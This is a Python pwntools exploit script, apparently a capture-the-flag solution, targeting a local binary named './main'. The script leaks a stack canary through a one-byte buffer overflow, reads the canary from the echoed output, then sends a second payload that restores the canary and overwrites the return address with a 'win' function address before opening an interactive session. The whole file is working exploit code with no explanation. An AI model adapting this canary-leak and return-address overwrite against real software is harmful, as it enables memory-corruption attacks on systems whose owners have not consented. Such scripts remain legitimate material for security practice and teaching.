from pwn import *

p=process('./main')

win=0x00000000004011d6

payload=b'A'*0x48 + b'B'
#payload+=p64(win)
#pause()
p.send(payload)

p.recvuntil(b'AAB')
canary = u64(b'\x00'+p.recvn(7))
print(hex(canary))

payload=b'A'*0x48
payload+=p64(canary)
payload+=b'B'*8
payload+=p64(win)

pause()
p.sendline(payload)


p.interactive()
